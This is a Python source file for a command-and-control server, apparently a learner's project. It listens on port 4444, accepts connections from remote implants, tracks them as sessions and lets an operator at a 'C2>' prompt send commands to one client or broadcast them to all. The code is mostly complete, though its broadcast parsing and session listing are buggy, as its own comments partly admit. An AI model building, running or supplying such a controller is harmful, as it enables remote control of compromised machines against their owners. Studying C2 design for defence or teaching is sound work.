import socket
import threading
import sys

client_id = 0

# dictionary to store cid,client_socket
clients = {}

# Lock in threading is, the specific thread refrenced will be
# given running priority and others will be blocked until the
# locked thread is released (also known as mutex:mutual exclusion)
lock = threading.Lock()


def handle_client(client_socket, client_addr, cid):
    # client connection
    print(f"[+] Client connected successfully : {cid}->{client_addr}")
    clients[cid] = client_socket

    # try except finally
    try:
        while True:
            # recieve banner?
            data = client_socket.recv(4096).decode("utf-8", errors="ignore")
            if not data:
                break
            print(f"[ID {cid}] Response: {data}")
    except Exception as e:
        print(f"[!] Error with client ID {cid}: {e}")
    finally:
        with lock:
            del clients[cid]
        client_socket.close()
        print(f"[!] Connection closed CID {cid}")


# command send to all ids
def send_to_all(command):
    with lock:
        for cid, client_socket in clients.items():
            try:
                client_socket.send(command.encode("utf-8"))
                print(f"[*] Sent command to ID {cid}")
            except Exception as e:
                print(f"[!] Error sending to ID {cid} : {e}")


def send_to_client(cid, command):
    with lock:
        if cid in clients:
            try:
                clients[cid].send(command.encode("utf-8"))
                print(f"[*] Sent command to ID {cid}")
            except Exception as e:
                print(f"[!] Error sending to ID {cid} : {e}")
        else:
            print(f"[!] Client with ID {cid} does not exist")


# could give error
def list_sessions():
    with lock:
        for cid, client_socket in clients.items():
            if not cid:
                print("[!] No clients connected")
            else:
                print("[*] Active connections:")
                print(f"[-]    ID {cid}")


def server_shell():
    while True:
        cmd = input("C2> ").strip()

        if cmd == "sessions":
            list_sessions()
        elif cmd.startswith("interact "):
            try:
                cid = int(cmd.split()[1])  ##
                if cid in clients:
                    print(f"[*] Interacting with ID {cid}. 'Type background' to exit")
                    while True:
                        sub_cmd = input(f"ID {cid}> ").strip()
                        if sub_cmd == "background":
                            break
                        elif sub_cmd:
                            send_to_client(cid, sub_cmd)
                else:
                    print(f"[!] Client ID {cid} not found")

            except (IndexError, ValueError):
                print("[!] Usage: interact <client_id>")

        elif cmd.startswith("broadcast "):
            command = cmd[:10].strip()  # till broadcast
            if command:  # but if the above returns till broadcast how will it parse the command for the successfully
                send_to_all(command)
            else:
                print("[!] Usage: broadcast <command>")
        elif cmd == "exit":
            with lock:
                for client_socket in clients.values():
                    client_socket.close()
            sys.exit(0)
        else:
            print("[!] Commands: sessions, interact <cid>, broadcast <command>, exit")


# the main logic
def main():
    global client_id

    IP = "0.0.0.0"
    PORT = 4444

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  ##
    server.bind((IP, PORT))
    server.listen(5)  # there are several modes of socket listen
    # listen(5) is for listening to incoming connections
    print(f"[*] Server started on IP {IP}:{PORT}")

    threading.Thread(target=server_shell, daemon=True).start()

    try:
        while True:
            client_socket, client_addr = server.accept()
            with lock:
                client_id += 1
                client_thread = threading.Thread(
                    target=handle_client, args=(client_socket, client_addr, client_id)
                )
                client_thread.daemon = True
                client_thread.start()
    except KeyboardInterrupt:
        print("\n[!] Shutting down server")
        server.close()


if __name__ == "__main__":
    main()
